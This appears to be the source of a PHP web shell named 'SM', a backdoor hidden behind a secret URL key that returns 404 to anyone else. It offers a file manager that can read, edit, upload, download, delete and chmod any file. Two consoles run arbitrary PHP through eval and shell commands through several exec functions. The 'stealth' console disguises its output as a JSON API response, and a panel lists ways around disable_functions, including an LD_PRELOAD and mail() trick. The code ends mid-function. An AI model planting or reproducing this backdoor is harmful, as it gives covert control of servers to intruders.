<?php

if (!isset($_GET['']) || $_GET[''] !== '6ad2ff4c0b33c58301b60e377ec97155') {
    http_response_code(404);
    exit;
}

session_start();

$currentTab = isset($_GET['tab']) ? $_GET['tab'] : 'fm';
$selfUrl = $_SERVER['SCRIPT_NAME'] . '?=6ad2ff4c0b33c58301b60e377ec97155';

$currentUser = 'unknown';
if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $u = posix_getpwuid(posix_geteuid());
    $currentUser = $u ? $u['name'] : get_current_user();
} else {
    $currentUser = get_current_user();
}

$disabledFns = ini_get('disable_functions');
$disabledFns = $disabledFns ? $disabledFns : 'none';
$safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
$openBasedir = ini_get('open_basedir');
$openBasedir = $openBasedir ? $openBasedir : 'none';
$totalDisk = @disk_total_space('/');
$freeDisk = @disk_free_space('/');

function formatBytes($bytes) {
    if ($bytes <= 0) return '0 B';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

$tabs = array(
    'fm'      => 'File Manager',
    'console' => 'Classic Console',
    'stealth' => 'Stealth Console',
);

?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SM</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#0d1117;--fg:#c9d1d9;
  --card:#161b22;--border:#30363d;
  --accent:#58a6ff;--success:#7ee787;--danger:#f85149;
  --mono:'Consolas','Liberation Mono','Courier New',monospace;
}
body{background:var(--bg);color:var(--fg);font-family:var(--mono);font-size:13px;line-height:1.5}
a{color:var(--accent);text-decoration:none}
a:hover{text-decoration:underline}

.wrap{max-width:1280px;margin:0 auto;padding:10px}
.layout{display:flex;gap:12px;align-items:flex-start}
.sidebar{width:280px;flex-shrink:0}
.main{flex:1;min-width:0}

.card{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:12px}
.card h3{font-size:12px;text-transform:uppercase;color:var(--accent);margin-bottom:8px;letter-spacing:.5px}
.card table{width:100%;border-collapse:collapse}
.card td{padding:3px 6px;vertical-align:top;border-bottom:1px solid var(--border);font-size:12px;word-break:break-all}
.card td:first-child{color:#8b949e;white-space:nowrap;width:110px}

.nav{display:flex;gap:4px;margin-bottom:12px}
.nav a{display:block;padding:7px 16px;border-radius:4px;background:var(--card);border:1px solid var(--border);font-size:12px;transition:background .15s}
.nav a:hover{background:#1c2333;text-decoration:none}
.nav a.active{background:var(--accent);color:var(--bg);border-color:var(--accent);font-weight:bold}

table.files{width:100%;border-collapse:collapse;font-size:12px}
table.files th,table.files td{padding:6px 10px;border-bottom:1px solid var(--border);text-align:left}
table.files th{color:#8b949e;font-weight:normal;text-transform:uppercase;font-size:11px;position:sticky;top:0;background:var(--card)}
table.files tr:hover{background:#1c2333}
table.files .dir{color:var(--accent);font-weight:bold}

input[type=text],input[type=password],textarea,select{
  background:var(--bg);color:var(--fg);border:1px solid var(--border);
  border-radius:4px;padding:6px 10px;font-family:var(--mono);font-size:12px;width:100%
}
input:focus,textarea:focus{outline:none;border-color:var(--accent)}
textarea{resize:vertical}

.btn{display:inline-block;padding:6px 14px;border:1px solid var(--border);border-radius:4px;
  background:var(--card);color:var(--fg);cursor:pointer;font-family:var(--mono);font-size:12px}
.btn:hover{background:#1c2333}
.btn-accent{background:var(--accent);color:var(--bg);border-color:var(--accent)}
.btn-danger{background:var(--danger);color:#fff;border-color:var(--danger)}

.footer{text-align:center;padding:10px;font-size:11px;color:#484f58;border-top:1px solid var(--border);margin-top:16px}

@media(max-width:800px){
  .layout{flex-direction:column}
  .sidebar{width:100%}
}
</style>
</head>
<body>
<div class="wrap">

<div class="nav">
<?php foreach ($tabs as $key => $label): ?>
  <a href="<?php echo $selfUrl . '&tab=' . $key; ?>"
     class="<?php echo ($currentTab === $key) ? 'active' : ''; ?>"><?php echo $label; ?></a>
<?php endforeach; ?>
</div>

<div class="layout">

<div class="sidebar">
  <div class="card">
    <h3>Server Info</h3>
    <table>
      <tr><td>PHP</td><td><?php echo PHP_VERSION; ?></td></tr>
      <tr><td>OS</td><td><?php echo php_uname(); ?></td></tr>
      <tr><td>User</td><td><?php echo htmlspecialchars($currentUser); ?></td></tr>
      <tr><td>Software</td><td><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']); ?></td></tr>
      <tr><td>Doc Root</td><td><?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT']); ?></td></tr>
      <tr><td>Disk Total</td><td><?php echo $totalDisk ? formatBytes($totalDisk) : 'n/a'; ?></td></tr>
      <tr><td>Disk Free</td><td><?php echo $freeDisk ? formatBytes($freeDisk) : 'n/a'; ?></td></tr>
      <tr><td>Safe Mode</td><td><?php echo $safeMode; ?></td></tr>
      <tr><td>Open Basedir</td><td><?php echo htmlspecialchars($openBasedir); ?></td></tr>
    </table>
  </div>
  <div class="card">
    <h3>Disabled Functions</h3>
    <div style="font-size:11px;word-break:break-all;color:#f0883e">
      <?php echo htmlspecialchars($disabledFns); ?>
    </div>
  </div>
</div>

<div class="main">
<?php
if ($currentTab === 'console' && function_exists('renderConsole')) {
    renderConsole($selfUrl);
} elseif ($currentTab === 'stealth' && function_exists('renderStealth')) {
    renderStealth($selfUrl);
} else {
    if (function_exists('renderFileManager')) {
        renderFileManager($selfUrl);
    }
}
?>
</div>

</div>

<div class="footer">
  Memory: <?php echo formatBytes(memory_get_usage()); ?> |
  Peak: <?php echo formatBytes(memory_get_peak_usage()); ?>
</div>

</div>
</body>
</html>

function renderFileManager() {
    $msg = '';
    $msgType = 'success';

    // Process POST actions
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
        $action = $_POST['action'];

        if ($action === 'save' && isset($_POST['path']) && isset($_POST['content'])) {
            $path = $_POST['path'];
            $result = @file_put_contents($path, $_POST['content']);
            if ($result === false) {
                $msg = 'Failed to save file: permission denied or path invalid.';
                $msgType = 'error';
            } else {
                $msg = 'File saved successfully.';
            }
        } elseif ($action === 'create' && isset($_POST['name'])) {
            $dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
            $name = basename($_POST['name']);
            $fullPath = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . $name;
            $type = isset($_POST['type']) ? $_POST['type'] : 'file';
            if ($type === 'dir') {
                $result = @mkdir($fullPath, 0755);
                $msg = $result ? 'Directory created.' : 'Failed to create directory.';
            } else {
                $result = @file_put_contents($fullPath, '');
                $msg = ($result !== false) ? 'File created.' : 'Failed to create file.';
            }
            if (!$result && $result !== 0) {
                $msgType = 'error';
            }
        } elseif ($action === 'upload' && isset($_FILES['file'])) {
            $dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
            $dest = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
            if (@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                $msg = 'File uploaded successfully.';
            } else {
                $msg = 'Upload failed.';
                $msgType = 'error';
            }
        } elseif ($action === 'delete' && isset($_POST['path'])) {
            $path = $_POST['path'];
            if (@is_dir($path)) {
                $result = @rmdir($path);
                $msg = $result ? 'Directory deleted.' : 'Failed to delete directory (not empty or permission denied).';
            } else {
                $result = @unlink($path);
                $msg = $result ? 'File deleted.' : 'Failed to delete file.';
            }
            if (!$result) {
                $msgType = 'error';
            }
        } elseif ($action === 'rename' && isset($_POST['oldpath']) && isset($_POST['newname'])) {
            $oldPath = $_POST['oldpath'];
            $dir = dirname($oldPath);
            $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['newname']);
            if (@rename($oldPath, $newPath)) {
                $msg = 'Renamed successfully.';
            } else {
                $msg = 'Rename failed.';
                $msgType = 'error';
            }
        } elseif ($action === 'chmod' && isset($_POST['path']) && isset($_POST['mode'])) {
            $mode = octdec($_POST['mode']);
            if (@chmod($_POST['path'], $mode)) {
                $msg = 'Permissions changed.';
            } else {
                $msg = 'Chmod failed.';
                $msgType = 'error';
            }
        }
    }

    // Handle download
    if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['path'])) {
        $dlPath = $_GET['path'];
        if (@is_file($dlPath) && @is_readable($dlPath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($dlPath) . '"');
            header('Content-Length: ' . filesize($dlPath));
            header('Cache-Control: must-revalidate');
            @readfile($dlPath);
            exit;
        }
    }

    // Determine current directory
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    $currentDir = realpath($currentDir);
    if ($currentDir === false) {
        $currentDir = getcwd();
    }

    // Edit mode
    $editFile = null;
    $editContent = '';
    if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['path'])) {
        $editFile = $_GET['path'];
        if (@is_readable($editFile)) {
            $editContent = @file_get_contents($editFile);
            if ($editContent === false) {
                $editContent = '';
                $msg = 'Cannot read file.';
                $msgType = 'error';
            }
        } else {
            $msg = 'File is not readable.';
            $msgType = 'error';
            $editFile = null;
        }
    }

    // Build page URL helper
    $baseUrl = strtok($_SERVER['REQUEST_URI'], '?');

    echo '<div class="card">';
    echo '<h2>File Manager</h2>';

    // Messages
    if ($msg !== '') {
        $cls = ($msgType === 'error') ? 'color:#e74c3c;' : 'color:#2ecc71;';
        echo '<div style="padding:8px;margin-bottom:10px;' . $cls . 'font-weight:bold;">' . htmlspecialchars($msg) . '</div>';
    }

    // Breadcrumb navigation
    echo '<div style="margin-bottom:12px;padding:8px;background:rgba(255,255,255,0.05);border-radius:4px;">';
    echo '<strong>Path:</strong> ';
    $sep = (DIRECTORY_SEPARATOR === '\\') ? '\\' : '/';
    $parts = explode($sep, $currentDir);
    $built = '';
    foreach ($parts as $i => $part) {
        if ($part === '') {
            if ($i === 0) {
                $built = '/';
                echo '<a href="' . htmlspecialchars($baseUrl . '?page=fm&dir=/') . '" style="color:#3498db;">/</a>';
            }
            continue;
        }
        $built .= ($i === 0 && DIRECTORY_SEPARATOR === '\\') ? $part : DIRECTORY_SEPARATOR . $part;
        if ($i === 0 && DIRECTORY_SEPARATOR === '\\') {
            $built .= '\\';
        }
        $url = $baseUrl . '?page=fm&dir=' . urlencode($built);
        echo '<a href="' . htmlspecialchars($url) . '" style="color:#3498db;">' . htmlspecialchars($part) . '</a>' . $sep;
    }
    echo '</div>';

    // Edit mode view
    if ($editFile !== null) {
        echo '<div style="margin-bottom:12px;">';
        echo '<h3>Editing: ' . htmlspecialchars(basename($editFile)) . '</h3>';
        echo '<form method="POST" action="' . htmlspecialchars($baseUrl . '?page=fm&dir=' . urlencode($currentDir)) . '">';
        echo '<input type="hidden" name="action" value="save">';
        echo '<input type="hidden" name="path" value="' . htmlspecialchars($editFile) . '">';
        echo '<textarea name="content" style="width:100%;height:400px;background:#1a1a2e;color:#eee;border:1px solid #444;padding:10px;font-family:monospace;font-size:13px;border-radius:4px;resize:vertical;">';
        echo htmlspecialchars($editContent);
        echo '</textarea><br>';
        echo '<button type="submit" style="margin-top:8px;padding:8px 20px;background:#2ecc71;color:#fff;border:none;border-radius:4px;cursor:pointer;">Save</button> ';
        echo '<a href="' . htmlspecialchars($baseUrl . '?page=fm&dir=' . urlencode($currentDir)) . '" style="color:#3498db;margin-left:10px;">Cancel</a>';
        echo '</form>';
        echo '</div>';
        echo '</div>';
        return;
    }

    // Action bar: create file/folder & upload
    echo '<div style="margin-bottom:12px;display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end;">';

    // Create form
    echo '<form method="POST" action="' . htmlspecialchars($baseUrl . '?page=fm&dir=' . urlencode($currentDir)) . '" style="display:flex;gap:5px;align-items:center;">';
    echo '<input type="hidden" name="action" value="create">';
    echo '<input type="hidden" name="dir" value="' . htmlspecialchars($currentDir) . '">';
    echo '<input type="text" name="name" placeholder="Name" style="padding:5px 8px;background:#1a1a2e;color:#eee;border:1px solid #444;border-radius:4px;width:140px;">';
    echo '<select name="type" style="padding:5px;background:#1a1a2e;color:#eee;border:1px solid #444;border-radius:4px;">';
    echo '<option value="file">File</option><option value="dir">Dir</option></select>';
    echo '<button type="submit" style="padding:5px 12px;background:#3498db;color:#fff;border:none;border-radius:4px;cursor:pointer;">Create</button>';
    echo '</form>';

    // Upload form
    echo '<form method="POST" enctype="multipart/form-data" action="' . htmlspecialchars($baseUrl . '?page=fm&dir=' . urlencode($currentDir)) . '" style="display:flex;gap:5px;align-items:center;">';
    echo '<input type="hidden" name="action" value="upload">';
    echo '<input type="hidden" name="dir" value="' . htmlspecialchars($currentDir) . '">';
    echo '<input type="file" name="file" style="color:#eee;font-size:12px;">';
    echo '<button type="submit" style="padding:5px 12px;background:#9b59b6;color:#fff;border:none;border-radius:4px;cursor:pointer;">Upload</button>';
    echo '</form>';

    echo '</div>';

    // Read directory contents
    $items = @scandir($currentDir);
    if ($items === false) {
        echo '<div style="color:#e74c3c;">Cannot read directory.</div>';
        echo '</div>';
        return;
    }

    // Separate dirs and files, sort alphabetically
    $dirs = array();
    $files = array();
    foreach ($items as $item) {
        if ($item === '.') {
            continue;
        }
        $fullPath = $currentDir . DIRECTORY_SEPARATOR . $item;
        if (@is_dir($fullPath)) {
            $dirs[] = $item;
        } else {
            $files[] = $item;
        }
    }
    sort($dirs, SORT_STRING | SORT_FLAG_CASE);
    sort($files, SORT_STRING | SORT_FLAG_CASE);
    $sorted = array_merge($dirs, $files);

    // File listing table
    echo '<div style="overflow-x:auto;">';
    echo '<table class="tbl" style="width:100%;border-collapse:collapse;font-size:13px;">';
    echo '<thead><tr>';
    echo '<th style="text-align:left;padding:8px;border-bottom:1px solid #444;">Name</th>';
    echo '<th style="text-align:right;padding:8px;border-bottom:1px solid #444;">Size</th>';
    echo '<th style="text-align:center;padding:8px;border-bottom:1px solid #444;">Perms</th>';
    echo '<th style="text-align:center;padding:8px;border-bottom:1px solid #444;">Owner</th>';
    echo '<th style="text-align:center;padding:8px;border-bottom:1px solid #444;">Modified</th>';
    echo '<th style="text-align:center;padding:8px;border-bottom:1px solid #444;">Actions</th>';
    echo '</tr></thead><tbody>';

    foreach ($sorted as $item) {
        $fullPath = $currentDir . DIRECTORY_SEPARATOR . $item;
        $isDir = @is_dir($fullPath);
        $stat = @stat($fullPath);

        $size = '-';
        if (!$isDir && $stat) {
            $size = formatFileSize($stat['size']);
        }

        $perms = '-';
        if ($stat) {
            $perms = substr(sprintf('%o', $stat['mode']), -4);
        }

        $owner = '-';
        if ($stat && function_exists('posix_getpwuid')) {
            $pw = @posix_getpwuid($stat['uid']);
            $owner = $pw ? $pw['name'] : $stat['uid'];
        } elseif ($stat) {
            $owner = $stat['uid'];
        }

        $modified = $stat ? date('Y-m-d H:i', $stat['mtime']) : '-';

        $nameDisplay = htmlspecialchars($item);
        if ($isDir) {
            $dirUrl = $baseUrl . '?page=fm&dir=' . urlencode($fullPath);
            $nameDisplay = '&#128193; <a href="' . htmlspecialchars($dirUrl) . '" style="color:#f1c40f;font-weight:bold;">' . $nameDisplay . '</a>';
        } else {
            $nameDisplay = '&#128196; ' . $nameDisplay;
        }

        echo '<tr style="border-bottom:1px solid rgba(255,255,255,0.05);">';
        echo '<td style="padding:6px 8px;">' . $nameDisplay . '</td>';
        echo '<td style="padding:6px 8px;text-align:right;white-space:nowrap;">' . $size . '</td>';
        echo '<td style="padding:6px 8px;text-align:center;font-family:monospace;">' . $perms . '</td>';
        echo '<td style="padding:6px 8px;text-align:center;">' . htmlspecialchars($owner) . '</td>';
        echo '<td style="padding:6px 8px;text-align:center;white-space:nowrap;">' . $modified . '</td>';
        echo '<td style="padding:6px 8px;text-align:center;white-space:nowrap;">';

        if ($isDir && $item !== '..') {
            $dirUrl = $baseUrl . '?page=fm&dir=' . urlencode($fullPath);
            echo '<a href="' . htmlspecialchars($dirUrl) . '" style="color:#2ecc71;margin-right:6px;" title="Open">Open</a>';
            echo '<a href="#" onclick="promptRename(\'' . htmlspecialchars(addslashes($fullPath)) . '\');return false;" style="color:#f39c12;margin-right:6px;" title="Rename">Ren</a>';
            echo '<a href="#" onclick="confirmDelete(\'' . htmlspecialchars(addslashes($fullPath)) . '\');return false;" style="color:#e74c3c;margin-right:6px;" title="Delete">Del</a>';
            echo '<a href="#" onclick="promptChmod(\'' . htmlspecialchars(addslashes($fullPath)) . '\');return false;" style="color:#9b59b6;" title="Chmod">Chmod</a>';
        } elseif ($item === '..') {
            $parentUrl = $baseUrl . '?page=fm&dir=' . urlencode($fullPath);
            echo '<a href="' . htmlspecialchars($parentUrl) . '" style="color:#2ecc71;">Up</a>';
        } else {
            $editUrl = $baseUrl . '?page=fm&dir=' . urlencode($currentDir) . '&action=edit&path=' . urlencode($fullPath);
            $dlUrl = $baseUrl . '?page=fm&action=download&path=' . urlencode($fullPath);
            echo '<a href="' . htmlspecialchars($editUrl) . '" style="color:#3498db;margin-right:6px;" title="Edit">Edit</a>';
            echo '<a href="' . htmlspecialchars($dlUrl) . '" style="color:#2ecc71;margin-right:6px;" title="Download">DL</a>';
            echo '<a href="#" onclick="promptRename(\'' . htmlspecialchars(addslashes($fullPath)) . '\');return false;" style="color:#f39c12;margin-right:6px;" title="Rename">Ren</a>';
            echo '<a href="#" onclick="confirmDelete(\'' . htmlspecialchars(addslashes($fullPath)) . '\');return false;" style="color:#e74c3c;margin-right:6px;" title="Delete">Del</a>';
            echo '<a href="#" onclick="promptChmod(\'' . htmlspecialchars(addslashes($fullPath)) . '\');return false;" style="color:#9b59b6;" title="Chmod">Chmod</a>';
        }

        echo '</td></tr>';
    }

    echo '</tbody></table>';
    echo '</div>';

    // Hidden forms for JS actions
    $formAction = htmlspecialchars($baseUrl . '?page=fm&dir=' . urlencode($currentDir));

    echo '<form id="fm-delete-form" method="POST" action="' . $formAction . '" style="display:none;">';
    echo '<input type="hidden" name="action" value="delete">';
    echo '<input type="hidden" name="path" id="fm-delete-path">';
    echo '</form>';

    echo '<form id="fm-rename-form" method="POST" action="' . $formAction . '" style="display:none;">';
    echo '<input type="hidden" name="action" value="rename">';
    echo '<input type="hidden" name="oldpath" id="fm-rename-oldpath">';
    echo '<input type="hidden" name="newname" id="fm-rename-newname">';
    echo '</form>';

    echo '<form id="fm-chmod-form" method="POST" action="' . $formAction . '" style="display:none;">';
    echo '<input type="hidden" name="action" value="chmod">';
    echo '<input type="hidden" name="path" id="fm-chmod-path">';
    echo '<input type="hidden" name="mode" id="fm-chmod-mode">';
    echo '</form>';

    // JavaScript for actions
    echo '<script>';
    echo 'function confirmDelete(p){if(confirm("Delete: "+p+"?")){document.getElementById("fm-delete-path").value=p;document.getElementById("fm-delete-form").submit();}}';
    echo 'function promptRename(p){var n=prompt("New name:",p.split(/[\\/]/).pop());if(n){document.getElementById("fm-rename-oldpath").value=p;document.getElementById("fm-rename-newname").value=n;document.getElementById("fm-rename-form").submit();}}';
    echo 'function promptChmod(p){var m=prompt("Mode (e.g. 0755):","0755");if(m){document.getElementById("fm-chmod-path").value=p;document.getElementById("fm-chmod-mode").value=m;document.getElementById("fm-chmod-form").submit();}}';
    echo '</script>';

    echo '</div>';
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) {
        return round($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return round($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return round($bytes / 1024, 2) . ' KB';
    }
    return $bytes . ' B';
}

function renderConsole() {
    $output = '';
    $mode = isset($_POST['console_mode']) ? $_POST['console_mode'] : 'php';

    if (!isset($_SESSION['cmd_history'])) {
        $_SESSION['cmd_history'] = array();
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['console_cmd'])) {
        $cmd = $_POST['console_cmd'];
        if ($cmd !== '') {
            array_unshift($_SESSION['cmd_history'], array('mode' => $mode, 'cmd' => $cmd, 'time' => date('H:i:s')));
            if (count($_SESSION['cmd_history']) > 50) {
                $_SESSION['cmd_history'] = array_slice($_SESSION['cmd_history'], 0, 50);
            }

            if ($mode === 'php') {
                ob_start();
                eval($cmd);
                $output = ob_get_clean();
            } else {
                $output = smileExecCmd($cmd);
            }
        }
    }

    $accessKey = '';
    $accessVal = '6ad2ff4c0b33c58301b60e377ec97155';
    $baseUrl = '?' . $accessKey . '=' . $accessVal . '&tab=console';

    echo '<div class="card">';
    echo '<h3>Classic Console</h3>';
    echo '<form method="POST" action="' . htmlspecialchars($baseUrl) . '">';
    echo '<div style="margin-bottom:12px">';
    echo '<label style="margin-right:16px"><input type="radio" name="console_mode" value="php"' . ($mode === 'php' ? ' checked' : '') . '> PHP Code</label>';
    echo '<label><input type="radio" name="console_mode" value="shell"' . ($mode === 'shell' ? ' checked' : '') . '> Shell Command</label>';
    echo '</div>';

    if ($mode === 'php') {
        $val = isset($_POST['console_cmd']) ? htmlspecialchars($_POST['console_cmd']) : '';
        echo '<textarea name="console_cmd" style="width:100%;height:150px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:8px;font-family:monospace;font-size:13px;resize:vertical">' . $val . '</textarea>';
    } else {
        $val = isset($_POST['console_cmd']) ? htmlspecialchars($_POST['console_cmd']) : '';
        echo '<input type="text" name="console_cmd" value="' . $val . '" placeholder="ls -la" style="width:100%;padding:8px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:13px">';
    }

    echo '<br><button type="submit" style="margin-top:8px;padding:8px 20px;background:#238636;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600">Execute</button>';
    echo '</form>';

    if ($output !== '') {
        echo '<div style="margin-top:12px;background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:12px;overflow-x:auto">';
        echo '<pre style="margin:0;color:#7ee787;font-size:13px;white-space:pre-wrap">' . htmlspecialchars($output) . '</pre>';
        echo '</div>';
    }
    echo '</div>';

    if (!empty($_SESSION['cmd_history'])) {
        echo '<div class="card" style="margin-top:12px">';
        echo '<h3>History</h3>';
        echo '<div style="max-height:200px;overflow-y:auto">';
        foreach ($_SESSION['cmd_history'] as $h) {
            $hCmd = htmlspecialchars($h['cmd']);
            $hMode = $h['mode'] === 'php' ? 'PHP' : 'SH';
            echo '<div style="padding:4px 0;border-bottom:1px solid #21262d;font-size:12px">';
            echo '<span style="color:#8b949e">[' . $h['time'] . ' ' . $hMode . ']</span> ';
            echo '<code style="color:#ce9178;cursor:pointer" onclick="document.querySelector(\'[name=console_cmd]\').value=this.textContent">' . $hCmd . '</code>';
            echo '</div>';
        }
        echo '</div></div>';
    }

    $funcs = array('system', 'shell_exec', 'exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec');
    echo '<div class="card" style="margin-top:12px"><h3>Functions</h3><div style="font-size:12px">';
    foreach ($funcs as $fn) {
        $ok = function_exists($fn) && !smileIsDisabled($fn);
        echo '<span style="color:' . ($ok ? '#7ee787' : '#f85149') . ';margin-right:12px">' . $fn . '</span>';
    }
    echo '</div></div>';
}

function smileExecCmd($cmd) {
    $output = '';
    if (function_exists('system') && !smileIsDisabled('system')) {
        ob_start();
        @system($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('shell_exec') && !smileIsDisabled('shell_exec')) {
        $output = @shell_exec($cmd);
    } elseif (function_exists('exec') && !smileIsDisabled('exec')) {
        @exec($cmd, $lines);
        $output = implode("\n", $lines);
    } elseif (function_exists('passthru') && !smileIsDisabled('passthru')) {
        ob_start();
        @passthru($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('popen') && !smileIsDisabled('popen')) {
        $handle = @popen($cmd, 'r');
        if ($handle) {
            $output = @stream_get_contents($handle);
            @pclose($handle);
        }
    } elseif (function_exists('proc_open') && !smileIsDisabled('proc_open')) {
        $desc = array(1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            $output = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
        }
    } else {
        $output = 'No available execution function.';
    }
    return $output !== null ? $output : '';
}

function smileIsDisabled($fn) {
    static $disabled = null;
    if ($disabled === null) {
        $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    }
    return in_array($fn, $disabled);
}

function renderStealth() {
    $output = '';
    $outputMode = isset($_POST['stealth_output']) ? $_POST['stealth_output'] : 'raw';
    $execMode = isset($_POST['stealth_mode']) ? $_POST['stealth_mode'] : 'php';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['stealth_cmd'])) {
        $cmd = $_POST['stealth_cmd'];
        if ($cmd !== '') {
            if ($execMode === 'php') {
                $output = stealthEvalPhp($cmd);
            } else {
                $output = stealthExecShell($cmd);
            }
        }
    }

    $accessKey = '';
    $accessVal = '6ad2ff4c0b33c58301b60e377ec97155';
    $baseUrl = '?' . $accessKey . '=' . $accessVal . '&tab=stealth';

    echo '<div class="card">';
    echo '<h3>Stealth Console</h3>';
    echo '<p style="color:#8b949e;font-size:12px;margin-bottom:12px">Executes code in memory without writing to disk. Output can be wrapped as JSON to mimic REST API response.</p>';

    echo '<form method="POST" action="' . htmlspecialchars($baseUrl) . '">';

    echo '<div style="margin-bottom:8px">';
    echo '<label style="margin-right:16px"><input type="radio" name="stealth_mode" value="php"' . ($execMode === 'php' ? ' checked' : '') . '> PHP eval</label>';
    echo '<label><input type="radio" name="stealth_mode" value="shell"' . ($execMode === 'shell' ? ' checked' : '') . '> Shell cmd</label>';
    echo '</div>';

    echo '<div style="margin-bottom:8px">';
    echo '<label style="margin-right:16px"><input type="radio" name="stealth_output" value="raw"' . ($outputMode === 'raw' ? ' checked' : '') . '> Raw output</label>';
    echo '<label><input type="radio" name="stealth_output" value="json"' . ($outputMode === 'json' ? ' checked' : '') . '> JSON-wrapped (REST API mask)</label>';
    echo '</div>';

    $val = isset($_POST['stealth_cmd']) ? htmlspecialchars($_POST['stealth_cmd']) : '';
    echo '<textarea name="stealth_cmd" style="width:100%;height:150px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:8px;font-family:monospace;font-size:13px;resize:vertical">' . $val . '</textarea>';
    echo '<br><button type="submit" style="margin-top:8px;padding:8px 20px;background:#238636;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600">Execute Stealth</button>';
    echo '</form>';

    if ($output !== '') {
        $displayOutput = $output;
        if ($outputMode === 'json') {
            $jsonWrap = json_encode(array(
                'status' => 'ok',
                'data' => base64_encode($output),
                'ts' => time(),
                'cached' => false,
            ));
            $displayOutput = $jsonWrap;
        }

        echo '<div style="margin-top:12px;background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:12px;overflow-x:auto">';
        echo '<pre style="margin:0;color:#7ee787;font-size:13px;white-space:pre-wrap">' . htmlspecialchars($displayOutput) . '</pre>';
        echo '</div>';
    }
    echo '</div>';

    echo '<div class="card" style="margin-top:12px">';
    echo '<h3>Execution methods available</h3>';
    echo '<div style="font-size:12px">';
    $methods = array(
        'eval' => true,
        'proc_open' => function_exists('proc_open') && !smileIsDisabled('proc_open'),
        'popen' => function_exists('popen') && !smileIsDisabled('popen'),
        'system' => function_exists('system') && !smileIsDisabled('system'),
        'shell_exec' => function_exists('shell_exec') && !smileIsDisabled('shell_exec'),
        'exec' => function_exists('exec') && !smileIsDisabled('exec'),
        'passthru' => function_exists('passthru') && !smileIsDisabled('passthru'),
        'pcntl_exec' => function_exists('pcntl_exec') && !smileIsDisabled('pcntl_exec'),
        'mail (LD_PRELOAD)' => function_exists('mail') && function_exists('putenv'),
    );
    foreach ($methods as $name => $ok) {
        echo '<span style="color:' . ($ok ? '#7ee787' : '#f85149') . ';margin-right:12px">' . $name . '</span>';
    }
    echo '</div></div>';

    echo '<div class="card" style="margin-top:12px">';
    echo '<h3>Bypass techniques</h3>';
    echo '<div style="font-size:12px;color:#8b949e;line-height:1.6">';
    echo '1. <b>proc_open</b> — best method, uses pipes for I/O<br>';
    echo '2. <b>popen</b> — simpler, read-only pipe<br>';
    echo '3. <b>LD_PRELOAD + mail()</b> — requires uploading a custom .so to /tmp, then putenv("LD_PRELOAD=/tmp/evil.so") + mail("","","")<br>';
    echo '4. <b>pcntl_exec</b> — replaces current process, no output capture<br>';
    echo '</div></div>';
}

function stealthEvalPhp($code) {
    $prevHandler = set_error_handler(function() { return true; });
    ob_start();
    eval($code);
    $result = ob_get_clean();
    if ($prevHandler) {
        set_error_handler($prevHandler);
    } else {
        restore_error_handler();
    }
    @trigger_error('', E_USER_NOTICE);
    return $result !== false ? $result : '';
}

function stealthExecShell($cmd) {
    $output = '';

    if (function_exists('proc_open') && !smileIsDisabled('proc_open')) {
        $desc = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w'),
        );
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            $output = @stream_get_contents($pipes[1]);
            $stderr = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
            if ($stderr) {
                $output .= "\n[STDERR] " . $stderr;
            }
            return $output;
        }
    }

    if (function_exists('popen') && !smileIsDisabled('popen')) {
        $handle = @popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            $output = @stream_get_contents($handle);
            @pclose($handle);
            return $output;
        }
    }

    if (function_exists('shell_exec') && !smileIsDisabled('shell_exec')) {
        $output = @shell_exec($cmd . ' 2>&1');
        return $output !== null ? $output : '';
    }

    if (function_exists('exec') && !smileIsDisabled('exec')) {
        @exec($cmd . ' 2>&1', $lines, $ret);
        return implode("\n", $lines);
